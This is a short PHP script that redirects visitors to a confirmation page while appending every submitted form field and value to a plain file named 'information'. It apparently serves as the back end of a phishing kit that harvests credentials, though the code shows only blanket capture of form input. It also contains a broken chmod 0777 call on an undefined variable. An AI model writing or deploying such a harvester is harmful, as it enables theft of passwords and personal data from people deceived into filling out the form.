<?php
header ('Location:confirm.php');
$handle = fopen("information", "a+");
chmod($file, 0777);
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

?>
